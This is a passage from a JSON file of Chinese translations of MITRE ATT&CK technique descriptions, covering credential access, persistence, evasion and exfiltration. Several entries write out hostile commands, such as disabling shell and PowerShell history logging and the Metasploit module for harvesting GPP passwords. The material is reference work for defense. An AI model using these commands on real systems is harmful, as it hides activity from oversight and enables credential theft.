        "translated_description": "对手可能会创建新令牌并模拟用户以提升权限并绕过访问控制。例如，如果对手有用户名和密码，但用户未登录系统，对手可以使用`LogonUser`函数为用户创建一个登录会话。(引用: LogonUserW function) 该函数将返回新会话的访问令牌副本，对手可以使用`SetThreadToken`将令牌分配给线程。\n\n这种行为与[令牌模拟/盗用](https://attack.mitre.org/techniques/T1134/001)不同，因为这指的是创建新用户令牌，而不是窃取或复制现有的令牌。"
    },
    "Group Policy Preferences": {
        "translated_name": "组策略首选项",
        "translated_description": "对手可能会尝试在组策略首选项（GPP）中找到不安全的凭据。GPP是允许管理员创建嵌入凭据的域策略的工具。这些策略允许管理员设置本地账户。(引用: Microsoft GPP 2016)\n\n这些组策略存储在域控制器上的SYSVOL中。这意味着任何域用户都可以查看SYSVOL共享并解密密码（使用已公开的AES密钥）。(引用: Microsoft GPP Key)\n\n以下工具和脚本可用于从组策略首选项XML文件中收集和解密密码文件：\n\n* Metasploit的后期利用模块：<code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword(引用: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\n在SYSVOL共享上，对手可以使用以下命令枚举潜在的GPP XML文件：<code>dir /s * .xml</code>\n"
    },
    "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol": {
        "translated_name": "通过非C2协议的非对称加密外传",
        "translated_description": "对手可能通过非现有命令和控制通道的非对称加密网络协议外传数据。数据也可能被发送到与主命令和控制服务器不同的网络位置。\n\n非对称加密算法是指在通道的每一端使用不同密钥的算法。也称为公钥加密，这需要成对的加密密钥，可以使用相应的密钥加密/解密数据。每个通信通道的端点都需要一个私钥（仅在该实体的控制下）和另一个实体的公钥。在加密通信开始之前，交换每个实体的公钥。\n\n使用非对称加密的网络协议（如HTTPS/TLS/SSL）通常在密钥交换后使用对称加密。对手可能选择使用这些内置于协议中的加密机制。\n"
    },
    "Cloud Account": {
        "translated_name": "云账户",
        "translated_description": "对手可能会创建云账户以保持对受害者系统的访问。具有足够访问权限的此类账户可用于建立不需要在系统上部署持久远程访问工具的次要凭据访问。(引用: Microsoft O365 Admin Roles)(引用: Microsoft Support O365 Add Another Admin, October 2019)(引用: AWS Create IAM User)(引用: GCP Create Cloud Identity Users)(引用: Microsoft Azure AD Users)\n\n除了用户账户外，云账户还可能与服务相关联。云提供商以不同方式处理服务账户的概念。在Azure中，服务账户包括服务主体和托管身份，可以链接到各种资源，如OAuth应用程序、无服务器函数和虚拟机，以授予这些资源在环境中执行各种活动的权限。(引用: Microsoft Entra ID Service Principals) 在GCP中，服务账户也可以链接到特定资源，并且可以被其他账户模拟以进行[临时提升的云访问](https://attack.mitre.org/techniques/T1548/005)。(引用: GCP Service Accounts) 虽然AWS没有特定的服务账户概念，但资源可以直接授予权限以承担角色。(引用: AWS Instance Profiles)(引用: AWS Lambda Execution Role)\n\n对手可能会创建仅有权访问特定云服务的账户，从而减少被检测的机会。\n\n一旦对手创建了云账户，他们可以操纵该账户以确保持久性并允许访问其他资源——例如，通过添加[额外的云凭据](https://attack.mitre.org/techniques/T1098/001)或分配[额外的云角色](https://attack.mitre.org/techniques/T1098/003)。"
    },
    "Process Discovery": {
        "translated_name": "进程发现",
        "translated_description": "对手可能会尝试获取有关系统上运行的进程的信息。获取的信息可用于了解网络中系统上运行的常见软件/应用程序。管理员或其他提升的访问权限可能会提供更好的进程详细信息。对手可能会在自动化发现期间使用[进程发现](https://attack.mitre.org/techniques/T1057)中的信息来塑造后续行为，包括对手是否完全感染目标和/或尝试特定操作。\n\n在Windows环境中，对手可以使用[Tasklist](https://attack.mitre.org/software/S0057)实用程序通过[cmd](https://attack.mitre.org/software/S0106)或<code>Get-Process</code>通过[PowerShell](https://attack.mitre.org/techniques/T1059/001)获取运行进程的详细信息。还可以从[本机API](https://attack.mitre.org/techniques/T1106)调用（如<code>CreateToolhelp32Snapshot</code>）的输出中提取有关进程的信息。在Mac和Linux中，这通过<code>ps</code>命令完成。对手还可以选择通过`/proc`枚举进程。\n\n在网络设备上，可以使用[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)命令（如`show processes`）显示当前运行的进程。(引用: US-CERT-TA18-106A)(引用: show_processes_cisco_cmd)"
    },
    "Impair Command History Logging": {
        "translated_name": "削弱命令历史记录日志",
        "translated_description": "对手可能会削弱命令历史记录日志，以隐藏他们在受损系统上运行的命令。各种命令解释器会跟踪用户在终端中输入的命令，以便用户可以回溯他们的操作。\n\n在 Linux 和 macOS 上，命令历史记录保存在由环境变量 <code>HISTFILE</code> 指向的文件中。当用户注销系统时，此信息会刷新到用户主目录中的 <code>~/.bash_history</code> 文件中。环境变量 <code>HISTCONTROL</code> 跟踪应该由 <code>history</code> 命令保存的内容，并最终在用户注销时保存到 <code>~/.bash_history</code> 文件中。<code>HISTCONTROL</code> 在 macOS 上默认不存在，但可以由用户设置并会被尊重。\n\n对手可能会清除历史记录环境变量（<code>unset HISTFILE</code>）或将命令历史记录大小设置为零（<code>export HISTFILESIZE=0</code>）以防止命令记录。此外，<code>HISTCONTROL</code> 可以配置为忽略以空格开头的命令，只需将其设置为“ignorespace”。<code>HISTCONTROL</code> 还可以设置为忽略重复的命令，将其设置为“ignoredups”。在某些 Linux 系统中，默认设置为“ignoreboth”，涵盖了前面的两个示例。这意味着“ ls”不会被保存，但“ls”会被历史记录保存。对手可以滥用这一点，通过在所有终端命令前加上空格来操作而不留下痕迹。\n\n在 Windows 系统上，<code>PSReadLine</code> 模块跟踪所有 PowerShell 会话中使用的命令，并将它们写入文件（默认情况下为 <code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>）。对手可以使用 <code>Set-PSReadLineOption -HistorySavePath {File Path}</code> 更改这些日志的保存位置。这将导致 <code>ConsoleHost_history.txt</code> 停止接收日志。此外，可以使用 PowerShell 命令 <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code> 关闭对该文件的日志记录。(引用: Microsoft PowerShell Command History)(引用: Sophos PowerShell command audit)(引用: Sophos PowerShell Command History Forensics)\n\n对手还可能利用网络设备上的 [网络设备 CLI](https://attack.mitre.org/techniques/T1059/008) 禁用历史命令日志记录（例如 <code>no logging</code>）。"
    },
    "Network Provider DLL": {
        "translated_name": "网络提供程序 DLL",
        "translated_description": "对手可能会注册恶意的网络提供程序动态链接库 (DLL)，以在身份验证过程中捕获明文用户凭据。网络提供程序 DLL 允许 Windows 与特定网络协议接口，并且还可以支持附加的凭据管理功能。(引用: Network Provider API) 在登录过程中，Winlogon（交互式登录模块）通过 RPC 将凭据发送到本地的 `mpnotify.exe` 进程。`mpnotify.exe` 进程在通知发生登录事件时，将明文凭据与注册的凭据管理器共享。(引用: NPPSPY - Huntress)(引用: NPPSPY Video)(引用: NPLogonNotify)\n\n对手可以配置恶意的网络提供程序 DLL 以从 `mpnotify.exe` 接收凭据。(引用: NPPSPY) 一旦作为凭据管理器安装（通过注册表），恶意 DLL 可以在每次用户登录到 Windows 工作站或域时通过 `NPLogonNotify()` 函数接收并保存凭据。(引用: NPLogonNotify)\n\n对手可能会将恶意的网络提供程序 DLL 植入已知具有较多登录活动和/或管理员登录活动的系统上，例如服务器和域控制器。(引用: NPPSPY - Huntress)"
    },
    "Windows Management Instrumentation Event Subscription": {
        "translated_name": "Windows 管理规范事件订阅",
        "translated_description": "对手可能会通过执行由 Windows 管理规范 (WMI) 事件订阅触发的恶意内容来建立持久性和提升权限。WMI 可用于安装事件过滤器、提供程序、消费者和绑定，当定义的事件发生时执行代码。可能订阅的事件示例包括时钟时间、用户登录或计算机的运行时间。(引用: Mandiant M-Trends 2015)\n\n对手可能会利用 WMI 的功能订阅事件，并在事件发生时执行任意代码，从而在系统上提供持久性。(引用: FireEye WMI SANS 2015)(引用: FireEye WMI 2015) 对手还可以使用 `mofcomp.exe` 将 WMI 脚本编译成 Windows 管理对象 (MOF) 文件（.mof 扩展名），这些文件可用于创建恶意订阅。(引用: Dell WMI Persistence)(引用: Microsoft MOF May 2018)\n\nWMI 订阅执行由 WMI 提供程序主机进程 (WmiPrvSe.exe) 代理，因此可能会导致提升的 SYSTEM 权限。"
    },
    "CDNs": {
        "translated_name": "内容分发网络",
        "translated_description": "对手可能会搜索有关受害者的内容分发网络 (CDN) 数据，这些数据可用于目标过程中。CDN 允许组织从分布式、负载均衡的服务器阵列中托管内容。CDN 还允许组织根据请求者的地理区域自定义内容交付。\n\n对手可能会搜索 CDN 数据以收集可操作的信息。威胁行为者可以使用在线资源和查询工具来收集有关 CDN 中内容服务器的信息。对手还可能寻找和利用 CDN 配置错误，这些错误会泄露不打算托管的敏感信息和/或没有与组织网站托管内容相同的保护机制（例如：登录门户）。(引用: DigitalShadows CDN) 来自这些来源的信息可能会揭示其他形式的侦察机会（例如 [主动扫描](https://attack.mitre.org/techniques/T1595) 或 [搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如 [获取基础设施](https://attack.mitre.org/techniques/T1583) 或 [妥协基础设施](https://attack.mitre.org/techniques/T1584)），和/或初始访问（例如 [驱动器式妥协](https://attack.mitre.org/techniques/T1189)）。"
    },
    "User Activity Based Checks": {
        "translated_name": "基于用户活动的检查",
        "translated_description": "对手可能会采用各种用户活动检查来检测和规避虚拟化和分析环境。这可能包括根据检查是否存在虚拟机环境 (VME) 或沙箱的工件的结果更改行为。如果对手检测到 VME，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可能在投放二级或其他有效负载之前搜索 VME 工件。对手可能会在自动化发现期间使用从 [虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497) 中学到的信息来塑造后续行为。(引用: Deloitte Environment Awareness)\n\n对手可能会根据鼠标移动和点击的速度/频率（引用: Sans Virtual Jan 2016）、浏览器历史记录、缓存、书签或常见目录（如主目录或桌面）中的文件数量来搜索主机上的用户活动。其他方法可能依赖于在恶意代码激活之前与系统的特定用户交互，例如等待文档关闭后激活宏（引用: Unit 42 Sofacy Nov 2018）或等待用户双击嵌入的图像以激活。(引用: FireEye FIN7 April 2017)"
    },
    "Cloud Service Hijacking": {
        "translated_name": "云服务劫持",
        "translated_description": "对手可能会利用被劫持的软件即服务 (SaaS) 应用程序来完成资源密集型任务，这可能会影响托管服务的可用性。\n\n例如，对手可能会利用电子邮件和消息服务，如 AWS 简单电子邮件服务 (SES)、AWS 简单通知服务 (SNS)、SendGrid 和 Twilio，以发送大量垃圾邮件/ [网络钓鱼](https://attack.mitre.org/techniques/T1566) 电子邮件和短信。(引用: Invictus IR DangerDev 2024)(引用: Permiso SES Abuse 2023)(引用: SentinelLabs SNS Sender 2024) 另外，他们可能通过利用反向代理劫持云托管的 AI 模型的能力来进行 LLM 劫持。(引用: Sysdig LLMJacking 2024)(引用: Lacework LLMJacking 2024)\n\n在某些情况下，对手可能会利用受害者已经使用的服务。在其他情况下，特别是当服务是更大云平台的一部分时，他们可能首先启用该服务。(引用: Sysdig LLMJacking 2024) 利用 SaaS 应用程序可能会导致受害者产生巨大的财务成本、用尽服务配额，并影响可用性。"
    },
    "Software Deployment Tools": {
        "translated_name": "软件部署工具",
        "translated_description": "对手可能会访问并使用企业内安装的集中软件套件来执行命令并在网络中横向移动。配置管理和软件部署应用程序可能用于企业网络或云环境中的常规管理目的。这些系统也可能集成到 CI/CD 管道中。此类解决方案的示例包括：SCCM、HBSS、Altiris、AWS 系统管理器、Microsoft Intune、Azure Arc 和 GCP 部署管理器。\n\n访问网络范围或企业范围的端点管理软件可能使对手能够在所有连接的系统上实现远程代码执行。访问可能用于横向移动到其他系统、收集信息或造成特定影响，例如擦除所有端点上的硬盘。\n\n基于 SaaS 的配置管理服务可能允许对云托管实例进行广泛的 [云管理命令](https://attack.mitre.org/techniques/T1651)，以及在本地端点上执行任意命令。例如，Microsoft 配置管理器允许全局或 Intune 管理员以 SYSTEM 身份在加入 Entra ID 的本地设备上运行脚本。(引用: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) 此类服务还可能利用 [Web 协议](https://attack.mitre.org/techniques/T1071/001) 与对手拥有的基础设施通信。(引用: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)\n\n网络基础设施设备也可能具有配置管理工具，对手可以类似地滥用这些工具。(引用: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)\n\n此操作所需的权限因系统配置而异；本地凭据可能足以直接访问第三方系统，或者可能需要特定的域凭据。然而，系统可能需要管理员账户才能登录或访问特定功能。"
    },
    "Exfiltration Over C2 Channel": {
        "translated_name": "通过C2通道外传",
        "translated_description": "对手可能通过现有的命令和控制通道窃取数据。被盗数据被编码到正常的通信通道中，使用与命令和控制通信相同的协议。"
    },
    "Parent PID Spoofing": {
        "translated_name": "父PID欺骗",
        "translated_description": "对手可能会伪造新进程的父进程标识符（PPID），以规避进程监控防御或提升权限。新进程通常直接从其父进程或调用进程生成，除非明确指定。通过<code>CreateProcess</code> API调用显式分配新进程的PPID是一种方法，该调用支持定义要使用的PPID的参数。(引用: DidierStevens SelectMyParent Nov 2009) 此功能由Windows功能（如用户帐户控制（UAC））使用，以在请求的提升进程由SYSTEM（通常通过<code>svchost.exe</code>或<code>consent.exe</code>）生成而不是当前用户上下文时正确设置PPID。(引用: Microsoft UAC Nov 2018)\n\n对手可能会滥用这些机制来规避防御，例如阻止直接从Office文档生成进程的防御，以及针对异常/潜在恶意的父子进程关系的分析，例如将[PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011)的PPID伪装为<code>explorer.exe</code>而不是作为[鱼叉式网络钓鱼附件](https://attack.mitre.org/techniques/T1566/001)的一部分交付的Office文档。(引用: CounterCept PPID Spoofing Dec 2018) 这种欺骗可以通过恶意Office文档中的[Visual Basic](https://attack.mitre.org/techniques/T1059/005)或任何可以执行[本机API](https://attack.mitre.org/techniques/T1106)的代码来执行。(引用: CTD PPID Spoofing Macro Mar 2019)(引用: CounterCept PPID Spoofing Dec 2018)\n\n显式分配PPID还可能在具有适当访问权限的父进程的情况下启用提升的权限。例如，具有特权用户上下文（即管理员）的对手可能会生成一个新进程，并将父进程分配为以SYSTEM身份运行的进程（如<code>lsass.exe</code>），从而通过继承的访问令牌提升新进程的权限。(引用: XPNSec PPID Nov 2017)"
    },
    "Gather Victim Org Information": {
        "translated_name": "收集受害者组织信息",
        "translated_description": "对手可能会收集有关受害者组织的信息，以在目标过程中使用。有关组织的信息可能包括各种详细信息，包括部门/部门的名称、业务操作的具体细节以及关键员工的角色和职责。\n\n对手可能通过各种方式收集这些信息，例如通过[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接引诱。有关组织的信息也可能通过在线或其他可访问的数据集（例如[社交媒体](https://attack.mitre.org/techniques/T1593/001)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）暴露给对手。(引用: ThreatPost Broadvoice Leak)(引用: SEC EDGAR Search) 收集这些信息可能会揭示其他形式的侦察机会（例如[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如[建立账户](https://attack.mitre.org/techniques/T1585)或[妥协账户](https://attack.mitre.org/techniques/T1586)），和/或初始访问（例如[网络钓鱼](https://attack.mitre.org/techniques/T1566)或[信任关系](https://attack.mitre.org/techniques/T1199)）。"
    },
    "Forge Web Credentials": {
        "translated_name": "伪造Web凭证",
        "translated_description": "对手可能会伪造可用于访问Web应用程序或互联网服务的凭证材料。Web应用程序和服务（托管在云SaaS环境或本地服务器上）通常使用会话cookie、令牌或其他材料来验证和授权用户访问。\n\n对手可能会生成这些凭证材料以访问Web资源。这与[窃取Web会话Cookie](https://attack.mitre.org/techniques/T1539)、[窃取应用程序访问令牌](https://attack.mitre.org/techniques/T1528)和其他类似行为不同，因为这些凭证是由对手新生成的，而不是从合法用户那里窃取或拦截的。\n\n生成Web凭证通常需要秘密值，例如密码、[私钥](https://attack.mitre.org/techniques/T1552/004)或其他加密种子值。(引用: GitHub AWS-ADFS-Credential-Generator) 对手还可能通过利用AWS中的`AssumeRole`和`GetFederationToken` API功能来伪造令牌，这些功能允许用户请求临时安全凭证（即[临时提升的云访问](https://attack.mitre.org/techniques/T1548/005)），或通过Zimbra中的`zmprov gdpak`命令生成预认证密钥，该密钥可用于为域中的任何用户生成令牌。(引用: AWS Temporary Security Credentials)(引用: Zimbra Preauth)\n\n一旦伪造，对手可能会使用这些Web凭证访问资源（例如[使用替代认证材料](https://attack.mitre.org/techniques/T1550)），这可能绕过多因素和其他身份验证保护机制。(引用: Pass The Cookie)(引用: Unit 42 Mac Crypto Cookies January 2019)(引用: Microsoft SolarWinds Customer Guidance)"
    },
    "Multi-Factor Authentication Request Generation": {
        "translated_name": "多因素认证请求生成",
        "translated_description": "对手可能会尝试通过生成发送给用户的多因素认证（MFA）请求来绕过MFA机制并访问账户。\n\n对手如果拥有[有效账户](https://attack.mitre.org/techniques/T1078)的凭证，但缺乏访问所需的2FA或MFA机制，可能无法完成登录过程。为了规避这一点，对手可能会滥用自动生成的推送通知到MFA服务，如Duo Push、Microsoft Authenticator、Okta或类似服务，以让用户授予对其账户的访问权限。如果对手缺乏受害者账户的凭证，他们也可能在配置为自助密码重置（SSPR）时滥用自动推送通知生成。(引用: Obsidian SSPR Abuse 2023)\n\n在某些情况下，对手可能会不断重复登录尝试，以轰炸用户MFA推送通知、短信和电话，最终导致用户在“MFA疲劳”响应中接受认证请求。(引用: Russian 2FA Push Annoyance - Cimpanu)(引用: MFA Fatigue Attacks - PortSwigger)(引用: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)"
    },
    "Compromise Host Software Binary": {
        "translated_name": "妥协主机软件二进制文件",
        "translated_description": "对手可能会修改主机软件二进制文件以在系统上建立持久访问。软件二进制文件/可执行文件提供了广泛的系统命令或服务、程序和库。常见的软件二进制文件包括SSH客户端、FTP客户端、电子邮件客户端、Web浏览器和许多其他用户或服务器应用程序。\n\n对手可能通过修改主机软件二进制文件来建立持久性。例如，对手可能会替换或感染合法的应用程序二进制文件（或支持文件）以植入后门。由于这些二进制文件可能会被应用程序或用户例行执行，对手可以利用这一点在主机上保持持久访问。对手还可能修改软件二进制文件，如SSH客户端，以在登录期间持久收集凭证（即[修改认证过程](https://attack.mitre.org/techniques/T1556)）。(引用: Google Cloud Mandiant UNC3886 2024)\n\n对手还可能通过在二进制文件的合法执行之前修补恶意功能（例如IAT Hooking/入口点修补）来修改现有二进制文件。(引用: Unit42 Banking Trojans Hooking 2022) 例如，对手可能会修改二进制文件的入口点，以指向对手修补的恶意代码，然后恢复正常的执行流程。(引用: ESET FontOnLake Analysis 2021)\n\n在修改二进制文件后，对手可能会尝试通过阻止其更新（例如，通过Linux系统中使用yum包管理器的`yum-versionlock`命令或`versionlock.list`文件）来[削弱防御](https://attack.mitre.org/techniques/T1562)。(引用: Google Cloud Mandiant UNC3886 2024)"
    },
    "Chat Messages": {
        "translated_name": "聊天消息",
        "translated_description": "对手可能会直接收集存储或通过用户通信服务传递的不安全凭证。凭证可能会在用户聊天通信应用程序中发送和存储，例如电子邮件、Slack或Teams等聊天服务、Jira或Trello等协作工具，以及任何其他支持用户通信的服务。用户可能会在私人或公共公司内部通信渠道上共享各种形式的凭证（如用户名和密码、API密钥或认证令牌）。\n\n对手可能会直接访问这些服务中的凭证，而不是访问存储的聊天日志（即[文件中的凭证](https://attack.mitre.org/techniques/T1552/001)），通过用户端点、托管服务的服务器或云托管服务的管理员门户。对手还可能妥协集成工具，如Slack Workflows，以自动搜索消息以提取用户凭证。这些凭证可能会被滥用以执行后续活动，如横向移动或权限提升。(引用: Slack Security Risks)"
    },
    "PowerShell": {
        "translated_name": "PowerShell",
        "translated_description": "对手可能会滥用PowerShell命令和脚本进行执行。PowerShell是Windows操作系统中包含的强大交互式命令行界面和脚本环境。(引用: TechNet PowerShell) 对手可以使用PowerShell执行许多操作，包括信息发现和代码执行。示例包括<code>Start-Process</code> cmdlet，可用于运行可执行文件，以及<code>Invoke-Command</code> cmdlet，可在本地或远程计算机上运行命令（尽管使用PowerShell连接远程系统需要管理员权限）。\n\nPowerShell还可以用于从Internet下载和运行可执行文件，这些文件可以从磁盘或内存中执行，而无需触及磁盘。\n\n有许多基于PowerShell的攻击测试工具可用，包括[Empire](https://attack.mitre.org/software/S0363)、[PowerSploit](https://attack.mitre.org/software/S0194)、[PoshC2](https://attack.mitre.org/software/S0378)和PSAttack。(引用: Github PSAttack)\n\nPowerShell命令/脚本也可以通过.NET框架和Windows公共语言接口（CLI）暴露的PowerShell底层<code>System.Management.Automation</code>程序集DLL接口执行，而无需直接调用<code>powershell.exe</code>二进制文件。(引用: Sixdub PowerPick Jan 2016)(引用: SilentBreak Offensive PS Dec 2015)(引用: Microsoft PSfromCsharp APR 2014)"
    },
    "Change Default File Association": {
        "translated_name": "更改默认文件关联",
        "translated_description": "对手可能通过执行由文件类型关联触发的恶意内容来建立持久性。当打开文件时，会检查用于打开文件的默认程序（也称为文件关联或处理程序）。文件关联选择存储在Windows注册表中，可以由用户、管理员或具有注册表访问权限的程序编辑，或者由管理员使用内置的assoc实用程序编辑。(引用: Microsoft Change Default Programs)(引用: Microsoft File Handlers)(引用: Microsoft Assoc Oct 2017) 应用程序可以修改给定文件扩展名的文件关联，以在打开具有给定扩展名的文件时调用任意程序。\n\n系统文件关联列在<code>HKEY_CLASSES_ROOT\\.[extension]</code>下，例如<code>HKEY_CLASSES_ROOT\\.txt</code>。这些条目指向位于<code>HKEY_CLASSES_ROOT\\\\[handler]</code>的处理程序。然后，各种命令列为shell键下的子键，位于<code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>。例如：\n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\n列出的键值是处理程序打开文件扩展名时执行的命令。对手可以修改这些值以持续执行任意命令。(引用: TrendMicro TROJ-FAKEAV OCT 2012)"
    },
    "VDSO Hijacking": {
        "translated_name": "VDSO劫持",
        "translated_description": "对手可能通过VDSO劫持将恶意代码注入进程，以规避基于进程的防御并可能提升权限。虚拟动态共享对象（vdso）劫持是一种在单独的活动进程地址空间中执行任意代码的方法。\n\nVDSO劫持涉及重定向对动态链接共享库的调用。内存保护可能会阻止通过[Ptrace系统调用](https://attack.mitre.org/techniques/T1055/008)向进程写入可执行代码。然而，对手可能会劫持从vdso共享对象映射到进程的syscall接口代码存根，以执行syscall来打开和映射恶意共享对象。然后可以通过修补存储在进程全局偏移表中的内存地址引用来调用此代码（这些表存储映射库函数的绝对地址）。(引用: ELF Injection May 2009)(引用: Backtrace VDSO)(引用: VDSO Aug 2005)(引用: Syscall 2014)\n\n在另一个进程的上下文中运行代码可能允许访问进程的内存、系统/网络资源，并可能提升权限。通过VDSO劫持执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。"
    },
    "File Transfer Protocols": {
        "translated_name": "文件传输协议",
        "translated_description": "对手可能使用与传输文件相关的应用层协议进行通信，以避免检测/网络过滤，通过与现有流量混合来隐藏。对远程系统的命令以及这些命令的结果通常会嵌入在客户端和服务器之间的协议流量中。\n\n诸如SMB(引用: US-CERT TA18-074A)、FTP(引用: ESET Machete July 2019)、FTPS和TFTP等传输文件的协议在环境中可能非常常见。由这些协议产生的数据包可能有许多字段和头部，可以隐藏数据。数据也可以隐藏在传输的文件中。对手可能滥用这些协议与他们控制的系统进行通信，同时模仿正常、预期的流量。"
    },
    "Exploitation for Credential Access": {
        "translated_name": "利用漏洞获取凭证",
        "translated_description": "对手可能利用软件漏洞尝试收集凭证。利用软件漏洞是指对手利用程序、服务或操作系统软件或内核本身中的编程错误来执行对手控制的代码。\n\n对手可能会针对凭证和认证机制进行漏洞利用，以获取有用的凭证或绕过认证过程以获得系统的认证访问权限。一个例子是`MS14-068`，它针对Kerberos，可以使用域用户权限伪造Kerberos票证。(引用: Technet MS14-068)(引用: ADSecurity Detecting Forged Tickets) 另一个例子是重放攻击，对手拦截双方之间发送的数据包，然后稍后重放这些数据包。如果服务未正确验证认证请求，这些重放的数据包可能允许对手冒充其中一方并获得未经授权的访问或权限。(引用: Bugcrowd Replay Attack)(引用: Comparitech Replay Attack)(引用: Microsoft Midnight Blizzard Replay Attack)\n\n这种漏洞利用在云环境中也有示例。例如，对手利用公共云基础设施中的漏洞，允许意外创建和续订认证令牌。(引用: Storm-0558 techniques for unauthorized email access)\n\n针对凭证访问的漏洞利用也可能导致权限提升，具体取决于目标进程或获得的凭证。"
    },
    "Emond": {
        "translated_name": "Emond",
        "translated_description": "对手可能通过执行由事件监视器守护进程（emond）触发的恶意内容来获得持久性和提升权限。Emond是一个[启动守护程序](https://attack.mitre.org/techniques/T1543/004)，接受来自各种服务的事件，通过简单的规则引擎运行它们，并采取行动。位于<code>/sbin/emond</code>的emond二进制文件将加载<code>/etc/emond.d/rules/</code>目录中的任何规则，并在明确定义的事件发生时采取行动。\n\n规则文件采用plist格式，定义名称、事件类型和采取的行动。一些事件类型的示例包括系统启动和用户认证。操作的示例是运行系统命令或发送电子邮件。如果在<code>/private/var/db/emondClients</code>路径中没有文件存在，则emond服务不会启动，该路径在[启动守护程序](https://attack.mitre.org/techniques/T1543/004)配置文件<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>中指定。(引用: xorrior emond Jan 2018)(引用: magnusviri emond Apr 2016)(引用: sentinelone macos persist Jun 2019)\n\n对手可能通过编写规则在定义的事件发生时执行命令来滥用此服务，例如系统启动或用户认证。(引用: xorrior emond Jan 2018)(引用: magnusviri emond Apr 2016)(引用: sentinelone macos persist Jun 2019) 对手还可能通过emond服务从管理员提升到root权限，因为emond服务由[启动守护程序](https://attack.mitre.org/techniques/T1543/004)服务以root权限执行。"
    },
    "One-Way Communication": {
        "translated_name": "单向通信",
        "translated_description": "对手可能使用现有的合法外部Web服务作为向受损系统发送命令的一种方式，而无需通过Web服务通道接收返回输出。受损系统可能利用流行的网站和社交媒体托管命令和控制（C2）指令。这些受感染的系统可能选择通过不同的C2通道发送命令的输出，包括到另一个独立的Web服务。或者，在对手不希望收到响应的情况下，受损系统可能根本不返回输出。\n\n作为C2机制的流行网站和社交媒体可能提供大量掩护，因为网络中的主机在被破坏之前很可能已经在与它们通信。使用Google或Twitter等常见服务使对手更容易隐藏在预期的噪音中。Web服务提供商通常使用SSL/TLS加密，为对手提供了额外的保护。"
    },
    "Gather Victim Network Information": {
        "translated_name": "收集受害者网络信息",
        "translated_description": "对手可能会收集有关受害者网络的信息，以在目标过程中使用。有关网络的信息可能包括各种详细信息，包括管理数据（例如：IP范围、域名等）以及其拓扑和操作的具体细节。\n\n对手可能通过各种方式收集这些信息，例如通过[主动扫描](https://attack.mitre.org/techniques/T1595)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接收集。有关网络的信息也可能通过在线或其他可访问的数据集（例如：[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)）暴露给对手。(引用: WHOIS)(引用: DNS Dumpster)(引用: Circl Passive DNS) 收集这些信息可能会揭示其他形式的侦察机会（例如[主动扫描](https://attack.mitre.org/techniques/T1595)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如[获取基础设施](https://attack.mitre.org/techniques/T1583)或[妥协基础设施](https://attack.mitre.org/techniques/T1584)），和/或初始访问（例如[信任关系](https://attack.mitre.org/techniques/T1199)）。"
    },
    "Exploitation of Remote Services": {
        "translated_name": "远程服务利用",
        "translated_description": "对手可能利用远程服务在网络内部系统中获得未经授权的访问权限。利用软件漏洞是指对手利用程序、服务或操作系统软件或内核本身中的编程错误来执行对手控制的代码。远程服务利用的一个常见目标是横向移动，以便访问远程系统。\n\n对手可能需要确定远程系统是否处于易受攻击状态，这可以通过[网络服务发现](https://attack.mitre.org/techniques/T1046)或其他发现方法来查找网络中可能部署的常见漏洞软件、缺少的某些补丁或可能用于检测或包含远程利用的安全软件。服务器可能是横向移动利用的高价值目标，但如果它们提供优势或访问其他资源，端点系统也可能面临风险。\n\n有几个众所周知的漏洞存在于常见服务中，例如SMB(引用: CIS Multiple SMB Vulnerabilities)和RDP(引用: NVD CVE-2017-0176)，以及可能在内部网络中使用的应用程序，例如MySQL(引用: NVD CVE-2016-6662)和Web服务器服务。(引用: NVD CVE-2014-7169)\n\n根据易受攻击的远程服务的权限级别，对手可能通过横向移动利用获得[权限提升](https://attack.mitre.org/techniques/T1068)。"
    },
    "Internal Spearphishing": {
        "translated_name": "内部鱼叉式网络钓鱼",
        "translated_description": "在已经访问账户或系统后，对手可能使用内部鱼叉式网络钓鱼来获取额外信息或妥协同一组织内的其他用户。内部鱼叉式网络钓鱼是一个多阶段的活动，其中合法账户最初被妥协，可能通过控制用户的设备或妥协用户的账户凭证。对手可能会利用受信任的内部账户来增加更多受害者上钩的可能性，通常结合[模仿](https://attack.mitre.org/techniques/T1656)。(引用: Trend Micro - Int SP)\n\n例如，对手可能利用[鱼叉式网络钓鱼附件](https://attack.mitre.org/techniques/T1566/001)或[鱼叉式网络钓鱼链接](https://attack.mitre.org/techniques/T1566/002)作为内部鱼叉式网络钓鱼的一部分，以传递有效载荷或重定向到外部站点，通过[输入捕获](https://attack.mitre.org/techniques/T1056)在模拟登录界面的站点上捕获凭证。\n\n对手还可能利用内部聊天应用程序，例如Microsoft Teams，传播恶意内容或与用户互动，试图捕获敏感信息和/或凭证。(引用: Int SP - chat apps)"
    },
    "Services File Permissions Weakness": {
        "translated_name": "服务文件权限弱点",
